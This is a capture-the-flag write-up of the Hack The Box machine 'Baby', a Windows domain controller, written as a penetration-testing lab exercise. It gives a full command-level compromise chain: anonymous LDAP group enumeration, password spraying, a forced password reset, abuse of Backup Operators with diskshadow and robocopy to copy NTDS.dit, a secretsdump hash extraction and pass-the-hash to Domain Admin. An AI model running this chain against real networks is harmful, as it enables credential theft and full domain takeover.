# Baby — Hack The Box, Windows / Active Directory

**TL;DR:** An anonymous LDAP bind on the domain controller leaks an initial
password sitting in a user's `description` field — but that password is wrong for
every account plain user enumeration returns. The accounts that matter are hidden
from anonymous reads on the user objects and exposed anyway through the `member`
attribute of the `it` and `dev` groups. One of them accepts the leaked password
with `STATUS_PASSWORD_MUST_CHANGE`; resetting it over SAMR yields WinRM. That user
sits in **Backup Operators** on a DC, which is not a hive-dumping primitive here
but an `NTDS.dit` one — `diskshadow` + `robocopy /b` reads the database past its
ACL, and the offline dump hands over the domain Administrator hash.

## 1. Recon

A top-ports scan fingerprints a Windows Server 2022 domain controller:

```
53, 88, 135, 139, 389, 445, 464, 593, 636, 3268/3269 (Global Catalog), 3389, 5985
```

SMB signing is required, so no relaying. The line that sets the direction comes
from the LDAP probe:

```
nxc ldap 10.129.x.x
→ BabyDC.baby.vl  [Windows Server 2022 Build 20348]  (domain: baby.vl)  (signing:True)
→ Null Auth: True
```

An anonymous bind on a DC is the whole opening move — it turns the directory into
a public read.

## 2. Anonymous LDAP — the decoy

rootDSE gives the domain `baby.vl` and the DC `BabyDC`. Anonymous user
enumeration returns 8 accounts across `OU=dev` and `OU=it`, and one of them is
carrying its own password in cleartext:

```
sAMAccountName: Teresa.Bell
description:    Set initial password to BabyStart123!
```

That is the intended bait, and it does not work. `BabyStart123!` is rejected by
all 8 accounts — SMB returns `STATUS_LOGON_FAILURE`, Kerberos pre-auth returns
`KDC_ERR_PREAUTH_FAILED`, and a `kpasswd` change attempt fails too, which rules
out "valid but expired" for the whole set. There are no AS-REP-roastable users,
no blank passwords, and anonymous SMB lists zero shares.

At this point the box looks like a dead end, and it is — if you treat anonymous
LDAP enumeration as "list the users".

## 3. The turn — group membership, not user objects

`(objectClass=user)` is filtered by the ACL on each user object. The `member`
attribute of a group is a *different* object's attribute, with a *different* ACL,
and here it was left readable to anonymous. Enumerating groups instead of users:

```
nxc ldap 10.129.x.x -u '' -p '' --query "(objectClass=group)" "cn member"
→ cn: it    member: CN=Caroline.Robinson,...
→ cn: dev   member: CN=Ian.Walker,...
```

Neither `Caroline.Robinson` nor `Ian.Walker` appeared in the user listing. The 8
OU-placed accounts were the decoy; the two accounts the directory tried to hide
are the real targets.

```
nxc smb 10.129.x.x -u Caroline.Robinson -p 'BabyStart123!'
→ STATUS_PASSWORD_MUST_CHANGE
```

`MUST_CHANGE` is not a rejection. The credential is correct — the account simply
cannot log on until the password is rotated, and rotating it is something the
password's own holder is allowed to do, over SAMR, unauthenticated-adjacent:

```
smbpasswd -r 10.129.x.x -U Caroline.Robinson      # old: BabyStart123!  new: <new-password>
```

Caroline is in `it`, and `it` is nested in **Remote Management Users**:

```
nxc winrm 10.129.x.x -u Caroline.Robinson -p '<new-password>'
→ (Pwn3d!)
```

```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> type user.txt
<user flag redacted>
```

## 4. Privilege escalation — Backup Operators on a DC

`whoami /all` is the entire local enumeration:

```
BUILTIN\Backup Operators   Alias   S-1-5-32-551   Enabled
SeBackupPrivilege          Back up files and directories    Enabled
SeRestorePrivilege         Restore files and directories    Enabled
```

Backup Operators on a domain controller is game over, but two obvious moves both
fail first, and they are worth recording because they look like the answer:

1. **The registry-hive route gives you nothing useful.** `nxc -M backup_operator`
   cleanly pulls SAM, SECURITY and SYSTEM through RemoteRegistry. On a DC that is
   the *local* SAM — the RID 500 in it is the DSRM Administrator, not the domain
   Administrator, and it does not authenticate to the domain.

2. **The privilege does not bypass the ACL on a normal open.** `C$` is readable,
   but reading `\Users\Administrator\Desktop\root.txt` straight off the share
   returns `STATUS_ACCESS_DENIED`. `SeBackupPrivilege` only applies when the file
   is opened with backup semantics (`FILE_FLAG_BACKUP_SEMANTICS`).

The real payoff is `NTDS.dit`, and the way to it is a shadow copy plus a
backup-mode copy. `NTDS.dit` is locked by the running DC, so snapshot first:

```bat
:: script.txt
set context persistent nowriters
add volume c: alias pwn
create
expose %pwn% Z:
```

```bat
diskshadow /s C:\Windows\Temp\script.txt
robocopy /b Z:\Windows\NTDS C:\Windows\Temp ntds.dit     :: /b = backup semantics
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
```

`robocopy /b` is what turns `SeBackupPrivilege` into a read of a file whose ACL
denies you. Pull both files back and dump offline:

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
→ Administrator:500:aad3b...:<administrator-nt-hash>:::
→ krbtgt:502:aad3b...:<krbtgt-nt-hash>:::
→ (every domain account)
```

## 5. Domain Admin

```
nxc winrm 10.129.x.x -u Administrator -H <administrator-nt-hash>
→ (Pwn3d!)
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<root flag redacted>
```

Cleanup matters here more than usual: the staged `ntds.dit`, the hive exports and
the diskshadow scripts all come off the box, and the shadow copy is deleted
(`diskshadow` → `delete shadows all`, verified with `vssadmin list shadows`).

## Takeaways

- **Anonymous LDAP enumeration is not "list users" — it is "list users *and*
  every group's membership".** A read ACL on a user object hides that object;
  it does not hide the object's DN from the `member` attribute of a group that
  references it. Here the two accounts that plain enumeration could not see were
  the entire foothold, and the eight it could see were planted to waste the
  password.
- **`STATUS_PASSWORD_MUST_CHANGE` is a hit, not a miss.** Anything that
  distinguishes itself from `LOGON_FAILURE` is telling you the password is right.
  Rotate it over SAMR (`smbpasswd -r`) and carry on.
- **Backup Operators on a DC means NTDS.dit, not registry hives.** The hives are
  the module's default and are worthless for domain auth on a DC, and the
  privilege does not help a plain file read. Snapshot with `diskshadow`, copy with
  `robocopy /b`, dump offline.
- **A password planted in a `description` field is a hint about the password
  policy, not necessarily about the account it is written on.** Spray it across
  every principal you can name — including the ones you had to derive.
